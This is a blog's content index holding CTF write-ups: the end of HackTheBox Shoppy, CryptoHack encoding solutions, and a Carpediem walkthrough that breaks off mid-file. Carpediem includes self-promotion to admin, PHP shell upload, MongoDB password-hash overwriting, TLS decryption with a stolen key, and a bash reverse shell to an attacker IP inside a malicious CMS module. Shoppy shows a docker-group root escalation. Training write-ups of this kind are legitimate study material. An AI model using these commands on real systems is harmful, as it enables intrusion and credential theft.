","date":"2023-01-14","objectID":"/hackthebox-shoppy/:4:0","tags":["hackthebox","machines"],"title":"Hackthebox - Shoppy","uri":"/hackthebox-shoppy/"},{"categories":["HackTheBox"],"content":"root.txt The id command shows the user deploy is part of the docker group. We can simply run this exploit from gtfobins to escalate to root. deploy@shoppy:/home/jaeger$ id uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker) deploy@shoppy:/home/jaeger$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh root@e79ceb533a94:/# whoami root root@e79ceb533a94:/# cat /root/root.txt e6****************************48 Thanks for reading! ","date":"2023-01-14","objectID":"/hackthebox-shoppy/:5:0","tags":["hackthebox","machines"],"title":"Hackthebox - Shoppy","uri":"/hackthebox-shoppy/"},{"categories":["CryptoHack"],"content":"CryptoHack general category part 1 (encoding) challenges.","date":"2022-12-23","objectID":"/cryptohack-challenges-general-encoding/","tags":["cryptohack","challenges"],"title":"CryptoHack - Challenges - General/Encoding","uri":"/cryptohack-challenges-general-encoding/"},{"categories":["CryptoHack"],"content":"This post contains the solution of challenges from general category (encoding) from the CryptoHack. ","date":"2022-12-23","objectID":"/cryptohack-challenges-general-encoding/:0:0","tags":["cryptohack","challenges"],"title":"CryptoHack - Challenges - General/Encoding","uri":"/cryptohack-challenges-general-encoding/"},{"categories":["CryptoHack"],"content":"Encoding ","date":"2022-12-23","objectID":"/cryptohack-challenges-general-encoding/:1:0","tags":["cryptohack","challenges"],"title":"CryptoHack - Challenges - General/Encoding","uri":"/cryptohack-challenges-general-encoding/"},{"categories":["CryptoHack"],"content":"ASCII Challenge Description ASCII is a 7-bit encoding standard which allows the representation of text using the integers 0-127. Using the below integer array, convert the numbers to their corresponding ASCII characters to obtain a flag. [99, 114, 121, 112, 116, 111, 123, 65, 83, 67, 73, 73, 95, 112, 114, 49, 110, 116, 52, 98, 108, 51, 125] Solution a = [99, 114, 121, 112, 116, 111, 123, 65, 83, 67, 73, 73, 95, 112, 114, 49, 110, 116, 52, 98, 108, 51, 125] print(\"\".join([chr(i) for i in a])) Output crypto{ASCII_pr1nt4bl3} ","date":"2022-12-23","objectID":"/cryptohack-challenges-general-encoding/:1:1","tags":["cryptohack","challenges"],"title":"CryptoHack - Challenges - General/Encoding","uri":"/cryptohack-challenges-general-encoding/"},{"categories":["CryptoHack"],"content":"Hex Challenge Description When we encrypt something the resulting ciphertext commonly has bytes which are not printable ASCII characters. If we want to share our encrypted data, it's common to encode it into something more user-friendly and portable across different systems. Hexadecimal can be used in such a way to represent ASCII strings. First each letter is converted to an ordinal number according to the ASCII table (as in the previous challenge). Then the decimal numbers are converted to base-16 numbers, otherwise known as hexadecimal. The numbers can be combined together, into one long hex string. Included below is a flag encoded as a hex string. Decode this back into bytes to get the flag. 63727970746f7b596f755f77696c6c5f62655f776f726b696e675f776974685f6865785f737472696e67735f615f6c6f747d Solution a = \"63727970746f7b596f755f77696c6c5f62655f776f726b696e675f776974685f6865785f737472696e67735f615f6c6f747d\" print(bytes.fromhex(a).decode()) Output crypto{You_will_be_working_with_hex_strings_a_lot} ","date":"2022-12-23","objectID":"/cryptohack-challenges-general-encoding/:1:2","tags":["cryptohack","challenges"],"title":"CryptoHack - Challenges - General/Encoding","uri":"/cryptohack-challenges-general-encoding/"},{"categories":["CryptoHack"],"content":"Base64 Challenge Description Another common encoding scheme is Base64, which allows us to represent binary data as an ASCII string using an alphabet of 64 characters. One character of a Base64 string encodes 6 binary digits (bits), and so 4 characters of Base64 encode three 8-bit bytes. Base64 is most commonly used online, so binary data such as images can be easily included into HTML or CSS files. Take the below hex string, decode it into bytes and then encode it into Base64. 72bca9b68fc16ac7beeb8f849dca1d8a783e8acf9679bf9269f7bf Solution import base64 a = '72bca9b68fc16ac7beeb8f849dca1d8a783e8acf9679bf9269f7bf' b = bytes.fromhex(a) print(base64.b64encode(b).decode('utf-8')) Output crypto/Base+64+Encoding+is+Web+Safe/ ","date":"2022-12-23","objectID":"/cryptohack-challenges-general-encoding/:1:3","tags":["cryptohack","challenges"],"title":"CryptoHack - Challenges - General/Encoding","uri":"/cryptohack-challenges-general-encoding/"},{"categories":["CryptoHack"],"content":"Bytes and Big Integers Challenge Description Cryptosystems like RSA works on numbers, but messages are made up of characters. How should we convert our messages into numbers so that mathematical operations can be applied? The most common way is to take the ordinal bytes of the message, convert them into hexadecimal, and concatenate. This can be interpreted as a base-16/hexadecimal number, and also represented in base-10/decimal. To illustrate: message: HELLO ascii bytes: [72, 69, 76, 76, 79] hex bytes: [0x48, 0x45, 0x4c, 0x4c, 0x4f] base-16: 0x48454c4c4f base-10: 310400273487 Solution from Crypto.Util.number import * a = 11515195063862318899931685488813747395775516287289682636499965282714637259206269 print(long_to_bytes(a).decode('utf-8')) Output crypto{3nc0d1n6_4ll_7h3_w4y_d0wn} ","date":"2022-12-23","objectID":"/cryptohack-challenges-general-encoding/:1:4","tags":["cryptohack","challenges"],"title":"CryptoHack - Challenges - General/Encoding","uri":"/cryptohack-challenges-general-encoding/"},{"categories":["CryptoHack"],"content":"Encoding Challenge Challenge Description Now you've got the hang of the various encodings you'll be encountering, let's have a look at automating it. Can you pass all 100 levels to get the flag? The 13377.py file attached below is the source code for what's running on the server. The pwntools_example.py file provides the start of a solution using the incredibly convenient pwntools library. which we recommend. If you'd prefer to use Python's in-built telnetlib, telnetlib_example.py is also provided. For more information about connecting to interactive challenges, see the FAQ. Feel free to skip ahead to the cryptography if you aren't in the mood for a coding challenge! Connect at nc socket.cryptohack.org 13377 Challenge files: - 13377.py - pwntools_example.py - telnetlib_example.py Solution If we directly check the nc socket.cryptohack.org 13377. It shows us an encrypted text from either of hex, base64, rot13, bigint, and utf-8. connecting to the server\rNow it will continue asking for decryption for 100 times. You can either do it manually :) but we can simply automate this task using python. Modifying the attached script pwntools_example.py in the challenge, I made the following script to automate the above task and retrieve the flag. from pwn import * # pip install pwntools from Crypto.Util.number import bytes_to_long, long_to_bytes import json import base64 import codecs import random r = remote('socket.cryptohack.org', 13377, level = 'debug') def json_recv(): line = r.recvline() return json.loads(line.decode()) def json_send(hsh): request = json.dumps(hsh).encode() r.sendline(request) for i in range(100): received = json_recv() print(\"Received type: \") rec_type = received[\"type\"] print(rec_type) print(\"Received encoded value: \") rec_enc = received[\"encoded\"] print(rec_enc) if (rec_type == \"base64\"): to_send = { \"decoded\": base64.b64decode(rec_enc).decode() # decoding b64 } json_send(to_send) elif (rec_type == \"rot13\"): to_send = { \"decoded\": codecs.decode(rec_enc, 'rot_13') # decoding rot13 } json_send(to_send) elif (rec_type == \"bigint\"): to_send = { \"decoded\": bytes.fromhex(rec_enc.replace(\"0x\",\"\")).decode() # bigint to text } json_send(to_send) elif (rec_type == \"utf-8\"): to_send = { \"decoded\": \"\".join([chr(b) for b in rec_enc]) # utf-8 to text } json_send(to_send) elif (rec_type == \"hex\"): to_send = { \"decoded\": bytes.fromhex(rec_enc.replace(\"0x\",\"\")).decode('utf-8') # hex to text } json_send(to_send) json_recv() # retrieve the final flag And we get the flag at the end. flag\rThanks for reading! ","date":"2022-12-23","objectID":"/cryptohack-challenges-general-encoding/:1:5","tags":["cryptohack","challenges"],"title":"CryptoHack - Challenges - General/Encoding","uri":"/cryptohack-challenges-general-encoding/"},{"categories":["HackTheBox"],"content":"HackTheBox hard linux machine Carpediem walkthrough.","date":"2022-12-03","objectID":"/hackthebox-carpediem/","tags":["hackthebox","machines"],"title":"HackTheBox - Carpediem","uri":"/hackthebox-carpediem/"},{"categories":["HackTheBox"],"content":"This post is focused on the walkthrough of Hard Linux Machine Carpediem from HackTheBox. ","date":"2022-12-03","objectID":"/hackthebox-carpediem/:0:0","tags":["hackthebox","machines"],"title":"HackTheBox - Carpediem","uri":"/hackthebox-carpediem/"},{"categories":["HackTheBox"],"content":"Summary Carpediem from HackTheBox, a hard linux machine. Here we get an interesting subdomain from fuzzing in which we can make an account and due to some misconfigurations elevate our low privilege user to admin user. From there we get access to the admin panel, where we abuse the upload functionality to get the initial foothold on the machine. In the docker container we’re in, we scan the internal network and discover a bunch of services. From these services, we expose a trudesk login panel and mongodb. Having full control of the mongodb, we update a user entry to add a custom password and login as that user. Looking through different tickets and mails, we discover the method to get credentials from Zoiper client and login as hflaccus to get the user.txt. For privesc, we first utilize tcpdump to capture the https traffic and analyze it using the ssl cert key in wireshark. Here we get credentials for the backdrop CMS where we exploit a vulnerability to get shell as www-data in a container which we elevate to root and finally escape the docker to get root on the actual machine. ","date":"2022-12-03","objectID":"/hackthebox-carpediem/:1:0","tags":["hackthebox","machines"],"title":"HackTheBox - Carpediem","uri":"/hackthebox-carpediem/"},{"categories":["HackTheBox"],"content":"Enumeration Starting out with the initial nmap scan. ┌──(kali㉿kali)-[~/…/hackthebox/hackthebox/machines/carpediem] └─$ nmap -A -vv 10.10.11.167 -oN nmapN PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 96:21:76:f7:2d:c5:f0:4e:e0:a8:df:b4:d9:5e:45:26 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCu1cI0YwetA1ogbtnmphJGBauZ9QMAFq5bAB5hXPJHo3juauB1ZE+fr+JYoWzt0dVoWONbGlmVE3t8udy73OQRLePqRcSqEC4PicOCDFwh3elJt0XuGC16nQJ7bu2++vWEdJb22erkKomy/qiUsDFBg/D+lUQkVo97JxJ9WarEzYVi21cOjcKIDqpXVQMjSuqsXZLSEz34uLnhZs1L7DeeT9V5H1B45Ev59N3VTQAM0bt6MOTfTqOfVQdzlYFl5VLWlZg3UkhZWQ6+Y4jeWKvSp6qviEfgHcaslUTO3WCMs/tYHIdAcxEE4XoCHfLaxHgI9s8hBWyma3ERw3aAX1iqv0UjnaGBSgd6Gght6m+FE8OlqhpUJllFeI31Sbs2aI8O/foxJ3QJcrAiM1ws0ZG7fJ/5vzEB0k1+T1tU9DfX4kgpiWL+reny+4s1bIKNo3OydiCCFBwe1DVOcqWyBz1TZp+ySPG6Pbw11+ZM15oeHeBK8rvVBep+wVJBB8aQ65k= | 256 b1:6d:e3:fa:da:10:b9:7b:9e:57:53:5c:5b:b7:60:06 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDdWYORigZRc9jSYZXZoTVpmvPD3h0bFyZ7rIPxq+IbykLHWRUFr4sClke/0p+B54VI5PfJOe9nFDjkHfygPfa8= | 256 6a:16:96:d8:05:29:d5:90:bf:6b:2a:09:32:dc:36:4f (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMyrIUnr3oGuEz3jkFdLlCXtY3qcUXoJ1cOL1arYAxBM 80/tcp open http syn-ack nginx 1.18.0 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD |_http-title: Comming Soon |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel With only 2 ports open, let’s go for port 80. Website on port 80\rThere’s nothing much to do in this website. Directory brute-forcing also didn’t give much. So checking for virtual hosts for carpediem.htb we got a subdomain portal.carpediem.htb. ┌──(kali㉿kali)-[~/…/hackthebox/hackthebox/machines/carpediem] └─$ wfuzz -c -f sub-fighter -w /home/kali/Documents/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://carpediem.htb' -H \"Host: FUZZ.carpediem.htb\" --hh 2875 Target: http://carpediem.htb/ Total requests: 4989 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000048: 200 462 L 2174 W 31090 Ch \"portal\" Total time: 0 Processed Requests: 4989 Filtered Requests: 4988 Requests/sec.: 0 ","date":"2022-12-03","objectID":"/hackthebox-carpediem/:2:0","tags":["hackthebox","machines"],"title":"HackTheBox - Carpediem","uri":"/hackthebox-carpediem/"},{"categories":["HackTheBox"],"content":"portal.carpediem.htb portal.carpediem.htb\rI tried directory brute-forcing here as well and got the following results. ┌──(kali㉿kali)-[~/…/hackthebox/hackthebox/machines/carpediem] └─$ gobuster dir -u http://portal.carpediem.htb/ -w /usr/share/wordlists/dirb/common.txt -o dirPortal /.hta (Status: 403) [Size: 285] /.htaccess (Status: 403) [Size: 285] /.htpasswd (Status: 403) [Size: 285] /admin (Status: 301) [Size: 328] [--\u003e http://portal.carpediem.htb/admin/] /assets (Status: 301) [Size: 329] [--\u003e http://portal.carpediem.htb/assets/] /build (Status: 301) [Size: 328] [--\u003e http://portal.carpediem.htb/build/] /classes (Status: 301) [Size: 330] [--\u003e http://portal.carpediem.htb/classes/] /dist (Status: 301) [Size: 327] [--\u003e http://portal.carpediem.htb/dist/] /inc (Status: 301) [Size: 326] [--\u003e http://portal.carpediem.htb/inc/] /index.php (Status: 200) [Size: 31090] /libs (Status: 301) [Size: 327] [--\u003e http://portal.carpediem.htb/libs/] /plugins (Status: 301) [Size: 330] [--\u003e http://portal.carpediem.htb/plugins/] /server-status (Status: 403) [Size: 285] /uploads (Status: 301) [Size: 330] [--\u003e http://portal.carpediem.htb/uploads/] Progress: 4614 / 4615 (99.98%)=============================================================== 2022/10/31 10:15:24 Finished =============================================================== We have a few interesting dirs here. But /uploads is currently forbidden and we also don’t have access to /admin. /uploads\r/admin\rLet’s dig in further. From the main page, we have login option, but since we don’t have any credentials yet so I created an account to check the further functionality. After loggin in, when we go to our profile on the following url http://portal.carpediem.htb/?p=my_account, we can see a Manage Account button. Profile Page\rHere we get a page to edit our account details. Edit Account\rGoing further down we can also update our details. Update Details\r","date":"2022-12-03","objectID":"/hackthebox-carpediem/:2:1","tags":["hackthebox","machines"],"title":"HackTheBox - Carpediem","uri":"/hackthebox-carpediem/"},{"categories":["HackTheBox"],"content":"Promoting yourself to admin On capturing the request for update details on burp, we have a POST parameter login_type. Update Details Request\rChanging the value of login_type from 2 to 1. It still returns a success message. success status\rVisiting the /admin endpoint, we can now access it. Admin Panel\r","date":"2022-12-03","objectID":"/hackthebox-carpediem/:2:2","tags":["hackthebox","machines"],"title":"HackTheBox - Carpediem","uri":"/hackthebox-carpediem/"},{"categories":["HackTheBox"],"content":"Leveraging the vulnerable upload functionality Looking around on the Quaterly Sales Report page at http://portal.carpediem.htb/admin/?page=maintenance/files there’s a message. Note\rThis could mean that we can abuse the upload functionality here. Attempting to check the Add button in the same page we can see the upload function calling which might be vulnerable as stated above. Add Feature\rupload request\rI tried looking for other pages which has upload functionality as well. ","date":"2022-12-03","objectID":"/hackthebox-carpediem/:2:3","tags":["hackthebox","machines"],"title":"HackTheBox - Carpediem","uri":"/hackthebox-carpediem/"},{"categories":["HackTheBox"],"content":"Foothold On visiting the My Account page at http://portal.carpediem.htb/admin/?page=user, we have a upload profile photo option. Account Details\rFrom wappalyzer we can determine that php is the backend language here so I tried uploading a php reverse shell. On uploading a photo or php shell, it calls the f=save parameter and due to this our shell doesn’t get uploaded. But if we replace save with upload here it might work. A few things to note here. While uploading the file we need to change the parameter f=upload and form-data name=\"file_upload\". Updating the request\rOn successfully uploading, it also shows the path of the uploaded file. On visiting the path, we get the shell as www-data in a docker container. reverse shell\rOn this docker container, there are a few credentials in some files in /var/www/html/portal. Credentials in /var/www/html/portal/initialize.php\rCredentials in /var/www/html/portal/classes/DBConnection.php\rWe have nothing much to check the credentials here, so we can analyze the network. ","date":"2022-12-03","objectID":"/hackthebox-carpediem/:3:0","tags":["hackthebox","machines"],"title":"HackTheBox - Carpediem","uri":"/hackthebox-carpediem/"},{"categories":["HackTheBox"],"content":"Analyzing the internal network Looking at our IP Address, we might be part of a 172.17.0.1 network. ifconfig\rNow we can analyze the internal network with nmap. From the nmap scan, we can see there are a few hosts up with open ports in the network. Nmap scan report for 172.17.0.1 PORT STATE SERVICE REASON 22/tcp open ssh syn-ack 80/tcp open http syn-ack Nmap scan report for 172.17.0.2 PORT STATE SERVICE REASON 21/tcp open ftp syn-ack 80/tcp open http syn-ack 443/tcp open https syn-ack Nmap scan report for 172.17.0.3 PORT STATE SERVICE REASON 3306/tcp open mysql syn-ack Nmap scan report for 172.17.0.4 Host is up (0.00016s latency). Not shown: 65534 closed ports PORT STATE SERVICE 27017/tcp open unknown Nmap scan report for 172.17.0.6 Host is up (0.00016s latency). Not shown: 65534 closed ports PORT STATE SERVICE 8118/tcp open unknown ","date":"2022-12-03","objectID":"/hackthebox-carpediem/:3:1","tags":["hackthebox","machines"],"title":"HackTheBox - Carpediem","uri":"/hackthebox-carpediem/"},{"categories":["HackTheBox"],"content":"Enumerating the discovered services Forwarding the ports with chisel, we can analyze each service. On attacker machine, ┌──(kali㉿kali)-[~/…/hackthebox/hackthebox/machines/carpediem] └─$ ./chisel server --reverse --port 8000 2022/11/01 00:32:25 server: Reverse tunnelling enabled 2022/11/01 00:32:25 server: Fingerprint N/tbpQW/0xU3zbPb5OiJ6Ri2saMVmU58oModSPs3IGA= 2022/11/01 00:32:25 server: Listening on http://0.0.0.0:8000 On target server, www-data@3c371615b7aa:/tmp$ ./chisel client 10.10.14.46:8000 R:8118:172.17.0.6:8118 R:27017:172.17.0.4:27017 R:3306:172.17.0.3:3306 R:21:172.17.0.2:21 R:80:172.17.0.2:80 R:443:172.17.0.2:443\u0026 Here the host 172.17.0.1 is the one we found in the beginning. Host 172.17.0.2 is running backdrop CMS for which we don’t currently have any credentials yet. backdrop CMS\rHost 172.17.0.3 is running a mysql service. Host 172.17.0.4 is running mongodb. Host 172.17.0.6 is running trudesk login page. trudesk login\r","date":"2022-12-03","objectID":"/hackthebox-carpediem/:3:2","tags":["hackthebox","machines"],"title":"HackTheBox - Carpediem","uri":"/hackthebox-carpediem/"},{"categories":["HackTheBox"],"content":"Infiltrating using mongodb and trudesk. Visiting port 27017 on web browser throws an error. mongodb on web\rBut we can access it through mongosh. After analyzing the mongodb, we found some credentials. ┌──(kali㉿kali)-[~/…/hackthebox/hackthebox/machines/carpediem] └─$ mongosh mongodb://127.0.0.1:27017 test\u003e show dbs admin 132.00 KiB config 108.00 KiB local 88.00 KiB trudesk 1.07 MiB test\u003e use trudesk trudesk\u003e show collections accounts counters departments groups messages notifications priorities role_order roles sessions settings tags teams templates tickets tickettypes trudesk\u003e db.accounts.find() [ { _id: ObjectId(\"623c8b20855cc5001a8ba13c\"), preferences: { tourCompleted: false, autoRefreshTicketGrid: true, openChatWindows: [] }, hasL2Auth: false, deleted: false, username: 'admin', password: '$2b$10$imwoLPu0Au8LjNr08GXGy.xk/Exyr9PhKYk1lC/sKAfMFd5i3HrmS', fullname: 'Robert Frost', email: 'rfrost@carpediem.htb', role: ObjectId(\"623c8b20855cc5001a8ba138\"), title: 'Sr. Network Engineer', accessToken: '22e56ec0b94db029b07365d520213ef6f5d3d2d9', __v: 0, lastOnline: ISODate(\"2022-04-07T20:30:32.198Z\") }, { _id: ObjectId(\"6243c0be1e0d4d001b0740d4\"), preferences: { tourCompleted: false, autoRefreshTicketGrid: true, openChatWindows: [] }, hasL2Auth: false, deleted: false, username: 'jhammond', email: 'jhammond@carpediem.htb', password: '$2b$10$n4yEOTLGA0SuQ.o0CbFbsex3pu2wYr924cKDaZgLKFH81Wbq7d9Pq', fullname: 'Jeremy Hammond', title: 'Sr. Systems Engineer', role: ObjectId(\"623c8b20855cc5001a8ba139\"), accessToken: 'a0833d9a06187dfd00d553bd235dfe83e957fd98', __v: 0, lastOnline: ISODate(\"2022-04-01T23:36:55.940Z\") }, { _id: ObjectId(\"6243c28f1e0d4d001b0740d6\"), preferences: { tourCompleted: false, autoRefreshTicketGrid: true, openChatWindows: [] }, hasL2Auth: false, deleted: false, username: 'jpardella', email: 'jpardella@carpediem.htb', password: '$2b$10$nNoQGPes116eTUUl/3C8keEwZAeCfHCmX1t.yA1X3944WB2F.z2GK', fullname: 'Joey Pardella', title: 'Desktop Support', role: ObjectId(\"623c8b20855cc5001a8ba139\"), accessToken: '7c0335559073138d82b64ed7b6c3efae427ece85', __v: 0, lastOnline: ISODate(\"2022-04-07T20:33:20.918Z\") }, { _id: ObjectId(\"6243c3471e0d4d001b0740d7\"), preferences: { tourCompleted: false, autoRefreshTicketGrid: true, openChatWindows: [] }, hasL2Auth: false, deleted: false, username: 'acooke', email: 'acooke@carpediem.htb', password: '$2b$10$qZ64GjhVYetulM.dqt73zOV8IjlKYKtM/NjKPS1PB0rUcBMkKq0s.', fullname: 'Adeanna Cooke', title: 'Director - Human Resources', role: ObjectId(\"623c8b20855cc5001a8ba139\"), accessToken: '9c7ace307a78322f1c09d62aae3815528c3b7547', __v: 0, lastOnline: ISODate(\"2022-03-30T14:21:15.212Z\") }, { _id: ObjectId(\"6243c69d1acd1559cdb4019b\"), preferences: { tourCompleted: false, autoRefreshTicketGrid: true, openChatWindows: [] }, hasL2Auth: false, deleted: false, username: 'svc-portal-tickets', email: 'tickets@carpediem.htb', password: '$2b$10$CSRmXjH/psp9DdPmVjEYLOUEkgD7x8ax1S1yks4CTrbV6bfgBFXqW', fullname: 'Portal Tickets', title: '', role: ObjectId(\"623c8b20855cc5001a8ba13a\"), accessToken: 'f8691bd2d8d613ec89337b5cd5a98554f8fffcc4', __v: 0, lastOnline: ISODate(\"2022-03-30T13:50:02.824Z\") } ] trudesk\u003e Sadly, they are not crackable. But since we have full read/write access to the db, we can update entries here as well. Looking here we can see that trudesk uses bcrypt to hash the passwords. We can write a simple python program (reference) to generate a similar hash and replace the original one. Generating the salt, import bcrypt newPassword = b'supersecretpassword' salt = bcrypt.gensalt(rounds=10) genPassword = bcrypt.hashpw(newPassword,salt) print(genPassword) Then running this file, ┌──(kali㉿kali)-[~/…/hackthebox/hackthebox/machines/carpediem] └─$ python3 script.py b'$2b$10$0bHoqmpfWmyu0.Q7T/LTd.CZGKcYH8vieKDxPPEi9Jdhr9Qfx5sGC' Now updating the db entry, trudesk\u003e db.accounts.update( {\"_id\": ObjectId(\"623c8b20855cc5001a8ba13c\")}, {$set: {\"password\": \"$2b$10$0bHoqmpfWmyu0.Q7T/LTd.CZGKcYH8vieKDxPPEi9Jdhr9Qfx5sGC\"}}","date":"2022-12-03","objectID":"/hackthebox-carpediem/:3:3","tags":["hackthebox","machines"],"title":"HackTheBox - Carpediem","uri":"/hackthebox-carpediem/"},{"categories":["HackTheBox"],"content":"Listening to the credentials Looking around on the Active Tickets page, we have a ticket regarding new employee on-boarding. new employee\rIn the mail it is mentioned that the new employee Horace Flaccus will get his credentials on a voicemail. It is also mentioned that they’ve been using zoiper client to do the process. mail\rWe can download the zoiper client and perform the mentioned process to get the credentials. After downloading the zoiper client, we can use above mentioned credentials 9650:2022 and carpediem.htb as domain. Simply dialing a call to *62 we can listen to the credentials. zoiper client\rFrom the obtained credentials, we can login as hflaccus to ssh. ┌──(kali㉿kali)-[~/…/hackthebox/hackthebox/machines/carpediem] └─$ ssh hflaccus@carpediem.htb hflaccus@carpediem.htb's password: hflaccus@carpediem:~$ whoami hflaccus hflaccus@carpediem:~$ ","date":"2022-12-03","objectID":"/hackthebox-carpediem/:3:4","tags":["hackthebox","machines"],"title":"HackTheBox - Carpediem","uri":"/hackthebox-carpediem/"},{"categories":["HackTheBox"],"content":"user.txt hflaccus@carpediem:~$ ls -al total 32 drwxr-x--- 4 hflaccus hflaccus 4096 May 26 14:34 . drwxr-xr-x 6 root root 4096 May 26 14:34 .. lrwxrwxrwx 1 hflaccus hflaccus 9 Apr 1 2022 .bash_history -\u003e /dev/null -rw-r--r-- 1 hflaccus hflaccus 220 Feb 25 2020 .bash_logout -rw-r--r-- 1 hflaccus hflaccus 3771 Feb 25 2020 .bashrc drwx------ 2 hflaccus hflaccus 4096 May 26 14:34 .cache drwxrwxr-x 3 hflaccus hflaccus 4096 May 26 14:34 .local -rw-r--r-- 1 hflaccus hflaccus 807 Feb 25 2020 .profile -rw-r----- 1 root hflaccus 33 Nov 1 05:23 user.txt hflaccus@carpediem:~$ cat user.txt 37****************************2c hflaccus@carpediem:~$ ","date":"2022-12-03","objectID":"/hackthebox-carpediem/:3:5","tags":["hackthebox","machines"],"title":"HackTheBox - Carpediem","uri":"/hackthebox-carpediem/"},{"categories":["HackTheBox"],"content":"Privilege Escalation Looking at the capabilities, we have tcpdump capability enabled. tcpdump cap\rAlso, linpeas output showed ssl cert key for the site backdrop.carpediem.htb. linpeas ssl cert\rSo we can try capturing the https traffic from tcpdump as we have the mechanism to decrypt the traffic. ","date":"2022-12-03","objectID":"/hackthebox-carpediem/:4:0","tags":["hackthebox","machines"],"title":"HackTheBox - Carpediem","uri":"/hackthebox-carpediem/"},{"categories":["HackTheBox"],"content":"Analyzing the https traffic First we need to capture the traffic for about 2 minutes. hflaccus@carpediem:/tmp$ tcpdump -i docker0 port 443 -w cap.pcap tcpdump: listening on docker0, link-type EN10MB (Ethernet), capture size 262144 bytes Then transfer the cap.pcap file and /etc/ssl/certs/backdrop.carpediem.htb.key file to our machine. Now fire-up the wireshark, add the decryption key and read the TLSv1.2 streams. tls stream\rBoom! We got some more credentials. These creds are for backrop.carpediem.htb site we found earlier. ","date":"2022-12-03","objectID":"/hackthebox-carpediem/:4:1","tags":["hackthebox","machines"],"title":"HackTheBox - Carpediem","uri":"/hackthebox-carpediem/"},{"categories":["HackTheBox"],"content":"SSH tunneling As we found earlier, backrop website is running on 172.17.0.2 port 443 so we can use ssh tunneling this time to forward that port. ┌──(kali㉿kali)-[~/…/hackthebox/machines/carpediem/pcaps] └─$ ssh -L 443:172.17.0.2:443 hflaccus@carpediem.htb backdrop.carpediem.htb\rSuccessfully logged in as jpardella. backdrop dashboard\r","date":"2022-12-03","objectID":"/hackthebox-carpediem/:4:2","tags":["hackthebox","machines"],"title":"HackTheBox - Carpediem","uri":"/hackthebox-carpediem/"},{"categories":["HackTheBox"],"content":"Exploiting Backdrop CMS Looking for backrop CMS exploits, we found this article. Following this vulnerability, we can upload a malicious tar file as a module and get RCE. Download the reference.tar binary from here. Untar it and modify the shell.php file as follows. ┌──(kali㉿kali)-[~/…/hackthebox/hackthebox/machines/carpediem] └─$ cat reference/shell.php \u003c?php system(\"bash -c 'bash -i \u003e\u0026 /dev/tcp/10.10.14.46/4444 0\u003e\u00261'\");?\u003e Add a new module at https://127.0.0.1/?q=admin/modules/install. Then select manual installation. manual installation\rUpload the malicious reference.tar file. upload the file\rEnable the newly added module. enable the module\r","date":"2022-12-03","objectID":"/hackthebox-carpediem/:4:3","tags":["hackthebox","machines"],"title":"HackTheBox - Carpediem","uri":"/hackthebox-carpediem/"},{"categories":["HackTheBox"],"content":"Shell as www-data on 172.17.0.2 Now start a netcat listener on port 4444 \u0026 visit the shell.php file. And we got the shell as www-data. shell as www-data\r","date":"2022-12-03","objectID":"/hackthebox-carpediem/:4:4","tags":["hackthebox","machines"],"title":"HackTheBox - Carpediem","uri":"/hackthebox-carpediem/"},{"categories":["HackTheBox"],"content":"www-data -\u003e root in the same container Looking around in the /opt directory, we have a file heartbeat.sh www-data@90c7f522b842:/opt$ cat heartbeat.sh cat heartbeat.sh #!/bin/bash #Run a site availability check every 10 seconds via cron checksum=($(/usr/bin/md5sum /var/www/html/backdrop/core/scripts/backdrop.sh)) if [[ $checksum != \"70a121c0202a33567101e2330c069b34\" ]]; then exit fi status=$(php /var/www/html/backdrop/core/scripts/backdrop.sh --root /var/www/html/backdrop https://localhost) grep \"Welcome to backdrop.carpediem.htb!\" \"$status\" if [[ \"$?\" != 0 ]]; then #something went wrong. restoring from backup. cp /root/index.php /var/www/html/backdrop/index.php fi www-data@90c7f522b842:/opt$ In this script, it is calling the backdrop.sh file. www-data@90c7f522b842:/var/www/html/backdrop$ cat core/scripts/backdrop.sh cat core/scripts/backdrop.sh #!/usr/bin/env php \u003c?php /** * Backdrop shell execution script * * Check for your PHP interpreter - on Windows you'll probably have to * replace line 1 with * #!c:/program files/php/php.exe * * @param path Backdrop's absolute root directory in local file system (optional). * @param URI A URI to execute, including HTTP protocol prefix. */ $script = basename(array_shift($_SERVER['argv'])); if (in_array('--help', $_SERVER['argv']) || empty($_SERVER['argv'])) { echo \u003c\u003c\u003cEOF Execute a Backdrop page from the shell. Usage: {$script} [OPTIONS] \"\u003cURI\u003e\" Example: {$script} \"http://mysite.org/node\" All arguments are long options. --help This page. --root Set the working directory for the script to the specified path. To execute Backdrop this has to be the root directory of your Backdrop installation, f.e. /home/www/foo/backdrop (assuming Backdrop is running on Unix). Current directory is not required. Use surrounding quotation marks on Windows. --verbose This option displays the options as they are set, but will produce errors from setting the session. URI The URI to execute, i.e. http://default/foo/bar for executing the path '/foo/bar' in your site 'default'. URI has to be enclosed by quotation marks if there are ampersands in it (f.e. index.php?q=node\u0026foo=bar). Prefix 'http://' is required, and the domain must exist in Backdrop's sites-directory. If the given path and file exists it will be executed directly, i.e. if URI is set to http://default/bar/foo.php and bar/foo.php exists, this script will be executed without bootstrapping Backdrop. To execute Backdrop's cron.php, specify http://default/core/cron.php as the URI. To run this script without --root argument invoke it from the root directory of your Backdrop installation with ./scripts/{$script} \\n EOF; exit; } // define default settings $cmd = 'index.php'; $_SERVER['HTTP_HOST'] = 'default'; $_SERVER['PHP_SELF'] = '/index.php'; $_SERVER['REMOTE_ADDR'] = '127.0.0.1'; $_SERVER['SERVER_SOFTWARE'] = NULL; $_SERVER['REQUEST_METHOD'] = 'GET'; $_SERVER['QUERY_STRING'] = ''; $_SERVER['PHP_SELF'] = $_SERVER['REQUEST_URI'] = '/'; $_SERVER['HTTP_USER_AGENT'] = 'console'; // toggle verbose mode if (in_array('--verbose', $_SERVER['argv'])) { $_verbose_mode = true; } else { $_verbose_mode = false; } // parse invocation arguments while ($param = array_shift($_SERVER['argv'])) { switch ($param) { case '--root': // change working directory $path = array_shift($_SERVER['argv']); if 